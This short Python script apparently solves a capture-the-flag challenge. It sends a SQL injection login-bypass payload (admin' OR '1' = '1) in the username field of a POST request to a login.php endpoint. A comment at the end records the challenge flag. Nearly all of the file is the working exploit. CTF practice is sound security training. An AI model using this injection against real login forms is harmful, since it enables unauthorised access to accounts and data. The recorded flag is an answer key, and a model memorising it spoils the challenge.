import requests
import urllib.parse

url = 'http://recruit.osiris.bar:32002'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

username = "admin' OR '1' = '1"
password = "admin"
payload = f"username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}"

response = requests.post(f"{url}/login.php?", headers=headers, data=payload)
print(response.text)

# flag{squealeeeeeee}
